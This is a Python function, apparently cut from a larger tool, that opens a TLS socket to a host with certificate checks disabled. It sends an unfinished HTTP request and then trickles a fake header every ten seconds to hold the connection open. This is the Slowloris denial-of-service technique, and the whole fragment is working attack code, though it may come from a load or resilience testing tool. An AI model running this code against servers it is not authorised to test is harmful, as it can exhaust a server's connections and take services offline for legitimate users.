def _slowloris_connection(host: str, port: int, stop_event: threading.Event) -> None:
  """Hold a socket open sending headers very slowly."""
  try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(10)
      ctx = ssl.create_default_context()
      ctx.check_hostname = False
      ctx.verify_mode    = ssl.CERT_NONE
      s = ctx.wrap_socket(s, server_hostname=host)
      s.connect((host, port))
      s.send(b"GET /health HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
      while not stop_event.is_set():
          time.sleep(10)
          s.send(b"X-Slowloris: keep-alive\r\n")
  except Exception:
      pass
  finally:
      try:
          s.close()
      except Exception:
          pass








